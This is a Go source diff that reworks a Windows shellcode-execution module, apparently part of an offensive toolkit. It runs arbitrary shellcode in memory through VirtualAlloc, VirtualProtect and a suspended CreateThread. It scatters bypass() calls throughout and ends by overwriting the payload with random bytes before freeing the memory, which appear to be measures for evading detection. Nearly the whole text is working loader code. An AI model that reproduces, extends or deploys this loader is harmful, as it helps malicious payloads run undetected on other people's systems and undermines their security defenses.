@@ -8,27 +8,11 @@ import (
 	"github.com/pkg/errors"
 	"golang.org/x/sys/windows"
 
+	"project/internal/module/windows/api"
 	"project/internal/random"
 )
 
-// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
-const (
-	memCommit  = 0x1000
-	memReserve = 0x2000
-	memRelease = 0x8000
-
-	pageReadWrite        = 0x04
-	pageExecute          = 0x10
-	pageExecuteReadWrite = 0x40
-
-	infinite = 0xFFFFFFFF
-)
-
-var (
-	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
-
-	procCreateThread = modKernel32.NewProc("CreateThread")
-)
+const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
 
 // Execute is used to execute shellcode, default method is VirtualProtect,.
 // It will block until shellcode return.
@@ -45,50 +29,67 @@ func Execute(method string, shellcode []byte) error {
 }
 
 // VirtualProtect is used to use virtual protect to execute shellcode,
-// it will block until shellcode exit, so usually  need create a goroutine
-// to execute VirtualProtect.
+// it will block until shellcode exit, if the shellcode will cover it self.
+// use CreateThread to replace it.
 func VirtualProtect(shellcode []byte) error {
 	l := len(shellcode)
 	if l == 0 {
 		return errors.New("empty data")
 	}
-
-	// allocate memory and copy shellcode
-	memAddr, err := windows.VirtualAlloc(0, uintptr(l), memReserve|memCommit, pageReadWrite)
+	size := uintptr(l)
+	// allocate memory for shellcode
+	memAddr, err := api.VirtualAlloc(0, size, memType, windows.PAGE_NOACCESS)
 	if err != nil {
-		return errors.WithStack(err)
+		return err
+	}
+	// create thread first and suspend
+	bypass()
+	tHandle, _, err := api.CreateThread(nil, 0, memAddr, nil, windows.CREATE_SUSPENDED)
+	if err != nil {
+		return err
+	}
+	var threadHandleClosed bool
+	defer func() {
+		if !threadHandleClosed {
+			api.CloseHandle(tHandle)
+		}
+	}()
+	// set read write and copy shellcode
+	bypass()
+	old := new(uint32)
+	err = api.VirtualProtect(memAddr, size, windows.PAGE_READWRITE, old)
+	if err != nil {
+		return err
 	}
 	copyShellcode(memAddr, shellcode)
-
-	old := new(uint32)
-
 	// set execute
 	bypass()
-	err = windows.VirtualProtect(memAddr, uintptr(l), pageExecute, old)
+	err = api.VirtualProtect(memAddr, size, windows.PAGE_EXECUTE, old)
 	if err != nil {
-		return errors.WithStack(err)
+		return err
 	}
-	// execute shellcode
+	// resume thread for execute shellcode
 	bypass()
-	threadAddr, _, err := procCreateThread.Call(0, 0, memAddr, 0, 0, 0)
-	if threadAddr == 0 {
-		return errors.WithStack(err)
+	_, err = windows.ResumeThread(tHandle)
+	if err != nil {
+		return errors.Wrap(err, "failed to resume thread")
 	}
 	// wait execute finish
 	bypass()
-	_, _ = windows.WaitForSingleObject(windows.Handle(threadAddr), infinite)
-
-	// set read write
-	bypass()
-	err = windows.VirtualProtect(memAddr, uintptr(l), pageReadWrite, old)
+	_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
 	if err != nil {
-		return errors.WithStack(err)
+		return errors.Wrap(err, "failed to wait thread")
 	}
-	// cover shellcode and free allocated memory
-	covertAllocatedMemory(memAddr, l)
-
+	// close thread handle at once
+	api.CloseHandle(tHandle)
+	threadHandleClosed = true
+	// set read write for clean shellcode
 	bypass()
-	return nil
+	err = api.VirtualProtect(memAddr, size, windows.PAGE_READWRITE, old)
+	if err != nil {
+		return err
+	}
+	return cleanShellcode(memAddr, size)
 }
 
 // CreateThread is used to create thread to execute shellcode.
@@ -99,32 +100,47 @@ func CreateThread(shellcode []byte) error {
 	if l == 0 {
 		return errors.New("empty data")
 	}
-
+	size := uintptr(l)
 	// allocate memory and copy shellcode
 	bypass()
-	memAddr, err := windows.VirtualAlloc(0, uintptr(l), memReserve|memCommit, pageExecuteReadWrite)
+	memAddr, err := api.VirtualAlloc(0, size, memType, windows.PAGE_EXECUTE_READWRITE)
 	if err != nil {
-		return errors.WithStack(err)
+		return err
 	}
-	copyShellcode(memAddr, shellcode)
-
-	// execute shellcode
+	// create thread first and suspend
 	bypass()
-	threadAddr, _, err := procCreateThread.Call(0, 0, memAddr, 0, 0, 0)
-	if threadAddr == 0 {
-		return errors.WithStack(err)
+	tHandle, _, err := api.CreateThread(nil, 0, memAddr, nil, windows.CREATE_SUSPENDED)
+	if err != nil {
+		return err
+	}
+	var threadHandleClosed bool
+	defer func() {
+		if !threadHandleClosed {
+			api.CloseHandle(tHandle)
+		}
+	}()
+	copyShellcode(memAddr, shellcode)
+	// resume thread for execute shellcode
+	bypass()
+	_, err = windows.ResumeThread(tHandle)
+	if err != nil {
+		return errors.Wrap(err, "failed to resume thread")
 	}
 	// wait execute finish
 	bypass()
-	_, _ = windows.WaitForSingleObject(windows.Handle(threadAddr), infinite)
-
-	// cover shellcode and free allocated memory
-	covertAllocatedMemory(memAddr, l)
-
-	bypass()
-	return nil
+	_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
+	if err != nil {
+		return errors.Wrap(err, "failed to wait thread")
+	}
+	// close thread handle at once
+	api.CloseHandle(tHandle)
+	threadHandleClosed = true
+	return cleanShellcode(memAddr, size)
 }
 
+// copyShellcode is used to copy shellcode to memory.
+// It will not call bypass when copy large shellcode
+// for prevent block when copy large shellcode.
 func copyShellcode(memAddr uintptr, shellcode []byte) {
 	bypass()
 	rand := random.NewRand()
@@ -148,12 +164,13 @@ func copyShellcode(memAddr uintptr, shellcode []byte) {
 	}
 }
 
-func covertAllocatedMemory(memAddr uintptr, l int) {
+// cleanShellcode is used to clean shellcode and free allocated memory.
+func cleanShellcode(memAddr uintptr, size uintptr) error {
 	bypass()
 	rand := random.NewRand()
-	for i := 0; i < l; i++ {
-		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
+	for i := uintptr(0); i < size; i++ {
+		b := (*byte)(unsafe.Pointer(memAddr + i)) // #nosec
 		*b = byte(rand.Int64())
 	}
-	_ = windows.VirtualFree(memAddr, 0, memRelease)
+	return api.VirtualFree(memAddr, 0, windows.MEM_RELEASE)
 }
